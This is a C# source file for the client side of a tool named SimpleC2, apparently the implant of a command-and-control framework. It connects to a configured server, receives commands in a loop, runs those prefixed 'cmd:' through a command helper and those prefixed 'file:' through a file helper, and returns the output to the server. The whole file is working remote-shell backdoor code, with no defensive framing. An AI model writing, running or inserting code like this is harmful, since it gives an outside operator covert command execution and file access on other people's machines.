using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace SimpleC2.Client
{
    public static class ClientSocket
    {
        private static TcpClient _client;
        private static NetworkStream _stream;

        public static void ConnectToServer()
        {
            try
            {
                _client = new TcpClient(Settings.ServerIP, Settings.ServerPort);
                _stream = _client.GetStream();
                Console.WriteLine("Connected to server.");
                Thread receiveThread = new Thread(ReceiveCommands);
                receiveThread.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Connection failed: {ex.Message}");
            }
        }

        private static void ReceiveCommands()
        {
            while (true)
            {
                try
                {
                    byte[] data = new byte[1024];
                    int bytes = _stream.Read(data, 0, data.Length);
                    if (bytes == 0) continue;
                    string command = Encoding.UTF8.GetString(data, 0, bytes);
                    Console.WriteLine($"Received command: {command}");
                    ExecuteCommand(command);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error receiving commands: {ex.Message}");
                }
            }
        }

        private static void ExecuteCommand(string command)
        {
            try
            {
                string output = "";
                if (command.StartsWith("cmd:"))
                {
                    output = CmdHelper.ExecuteCommand(command.Substring(4));
                }
                else if (command.StartsWith("file:"))
                {
                    output = FileHelper.HandleFileCommand(command.Substring(5));
                }
                SendResponse(output);
            }
            catch (Exception ex)
            {
                SendResponse($"Error executing command: {ex.Message}");
            }
        }

        private static void SendResponse(string response)
        {
            byte[] data = Encoding.UTF8.GetBytes(response);
            _stream.Write(data, 0, data.Length);
        }
    }
}